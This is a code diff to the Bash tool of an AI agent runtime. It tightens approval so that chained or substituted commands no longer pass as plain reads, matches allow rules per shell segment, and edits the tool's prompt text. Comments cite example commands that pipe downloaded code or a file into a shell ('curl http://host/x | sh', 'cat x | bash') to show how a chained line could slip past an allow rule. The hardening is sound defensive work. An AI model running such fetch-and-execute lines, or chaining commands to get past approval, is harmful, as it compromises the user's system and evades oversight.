@@ -17,6 +17,7 @@ import (
 
 	"github.com/KPO-Tech/seshat-runtime/internal/envfilter"
 	"github.com/KPO-Tech/seshat-runtime/internal/sandbox"
+	"github.com/KPO-Tech/seshat-runtime/internal/shellparse"
 	tool "github.com/KPO-Tech/seshat-runtime/internal/tools/registry"
 	"github.com/KPO-Tech/seshat-runtime/internal/tools/schema"
 	"github.com/KPO-Tech/seshat-runtime/internal/types"
@@ -163,7 +164,7 @@ func (t *Tool) Definition() tool.Definition {
 		Name:        ToolName,
 		DisplayName: "Bash",
 		SearchHint:  SearchHint,
-		Description: Description,
+		Description: Description + shellNote(runtime.GOOS, t.shell),
 		Category:    "filesystem",
 		InputSchema: schema.FromMap(map[string]any{
 			"type": "object",
@@ -281,7 +282,10 @@ func (t *Tool) Call(
 		// is either on the explicit allowlist or is a pure read/state-change command.
 		// Both cases bypass the global approval pipeline entirely.
 		// Mirrors Codex's ExecApprovalRequirement::Skip.
-		skipApproval := policyResult.Decision == sandbox.DecisionAllow
+		// The policy reads the line as a whole: "ls\nrm -rf x" and "cat x | bash"
+		// are classified as plain reads. Only a single simple command skips the
+		// approval, never a chain, a substitution or a redirection.
+		skipApproval := policyResult.Decision == sandbox.DecisionAllow && isSingleSimpleCommand(command)
 
 		// Mode-specific fast-path (e.g. AcceptEdits allows certain writes).
 		if !skipApproval {
@@ -477,7 +481,15 @@ func (t *Tool) PreparePermissionMatcher(_ context.Context, input map[string]any)
 		return nil, nil
 	}
 	return func(ruleContent string) bool {
-		return permissionRuleContentMatches(ruleContent, command)
+		// A command line is read as a shell reads it, not as one piece of text: the
+		// rule "git *" must not cover "git status; curl http://host/x | sh". The
+		// engine compares deny and ask rules more strictly still (see
+		// permissions.shellRuleMatcher); this matcher is the allow reading.
+		_, prefix := legacyPrefixRule(strings.TrimSpace(ruleContent))
+		exactRule := !hasRuleWildcard(ruleContent) && !prefix
+		return shellparse.MatchesAllow(command, func(segment string) bool {
+			return permissionRuleContentMatches(ruleContent, segment)
+		}, exactRule)
 	}, nil
 }
 
@@ -621,7 +633,7 @@ func (t *Tool) executeLocalCommand(ctx context.Context, execCtx *ExecutionContex
 		return t.executeViaSandbox(cmdCtx, execCtx, actualCommand, startTime)
 	}
 
-	cmdPath, cmdArgs, sandboxEnv, sandboxed := commandWithLandlock(t.shell, []string{"-c", actualCommand}, execCtx.WorkingDirectory)
+	cmdPath, cmdArgs, sandboxEnv, sandboxed := commandWithLandlock(t.shell, shellArgs(t.shell, actualCommand), execCtx.WorkingDirectory)
 
 	if execCtx.WorkingDirectory != "" && !sandboxed && t.config != nil && t.config.RequireSandbox {
 		return nil, fmt.Errorf("sandbox required but unavailable on this host: refusing to run the command unconfined")
@@ -889,16 +901,6 @@ func (t *Tool) SandboxKind() sandbox.EnvironmentKind {
 	return sandbox.EnvironmentLocal
 }
 
-// DetectShell picks the best available shell, cached at startup.
-func DetectShell() string {
-	for _, sh := range []string{"bash", "sh", "zsh"} {
-		if _, err := exec.LookPath(sh); err == nil {
-			return sh
-		}
-	}
-	return "sh"
-}
-
 // ── cappedBuffer — head + tail biased truncation ───────────────────────────────
 
 // cappedBuffer captures up to `max` bytes of output from a command, keeping
@@ -993,29 +995,29 @@ The working directory persists between commands but shell state does not. The en
 
 ## When to use
 
-Use Bash when no dedicated tool covers the operation: running build systems, package managers, git commands, test runners, CLI tools, process management, or one-off scripts.
+Use bash when no dedicated tool covers the operation: running build systems, package managers, git commands, test runners, CLI tools, process management, or one-off scripts.
 
 ## When NOT to use
 
-Prefer dedicated tools over Bash whenever a dedicated tool exists — they are safer, parse output correctly, and respect permission boundaries:
-- File discovery: use Glob (not find or ls)
-- Content search: use Grep (not grep or rg)
-- Read files: use FileRead (not cat/head/tail)
-- Edit files: use FileEdit (not sed/awk)
-- Write files: use FileWrite (not echo > / cat <<EOF)
-- MCP tools: if an MCP-provided tool covers the same operation, prefer the MCP tool over a Bash equivalent
+Prefer dedicated tools over bash whenever a dedicated tool exists — they are safer, parse output correctly, and respect permission boundaries:
+- File discovery: use glob (not find or ls)
+- Content search: use grep (not shell grep or rg)
+- Read files: use read_file (not cat/head/tail)
+- Edit files: use edit_file (not sed/awk)
+- Write files: use write_file (not echo > / cat <<EOF)
+- MCP tools: if an MCP-provided tool covers the same operation, prefer the MCP tool over a bash equivalent
 
 Instructions:
 - description is required: a clear, 5-10 word summary in active, present tense (e.g. "Lists files in current directory", "Runs the test suite"). It's shown to the user in place of the raw command whenever the tool call is collapsed, so avoid vague filler like "Runs a command".
 - If your command will create new directories or files, first use this tool to run ls to verify the parent directory exists and is the correct location.
 - Always quote file paths that contain spaces with double quotes in your command.
 - Try to maintain your current working directory throughout the session by using absolute paths and avoiding cd. You may use cd if the user explicitly requests it.
-- You may specify an optional timeout in milliseconds (up to 300000ms / 5 minutes). By default, your command times out after 30000ms.
+- You may specify an optional timeout in seconds (up to 300, which is 5 minutes). By default, your command times out after 30 seconds.
 - You can use run_in_background to run the command in the background and return immediately.
 
 When issuing multiple commands:
-- If the commands are independent and can run in parallel, make multiple Bash tool calls in a single message.
-- If the commands depend on each other and must run sequentially, use a single Bash call with && to chain them together.
+- If the commands are independent and can run in parallel, make multiple bash calls in a single message.
+- If the commands depend on each other and must run sequentially, use a single bash call with && to chain them together.
 - Use ; only when you need to run commands sequentially but do not care if earlier commands fail.
 - Do not use newlines to separate commands.
 
@@ -1046,7 +1048,7 @@ Avoid unnecessary sleep commands:
 - Do not retry failing commands in a sleep loop - diagnose the root cause.
 - If you must sleep, keep the duration short (1-5 seconds).
 
-Use the gh command via Bash for GitHub-related tasks such as issues, pull requests, checks, and releases.`
+Use the gh command via bash for GitHub-related tasks such as issues, pull requests, checks, and releases.`
 
 // SearchHint is a hint for tool search functionality.
 const SearchHint = "run shell commands in the terminal"
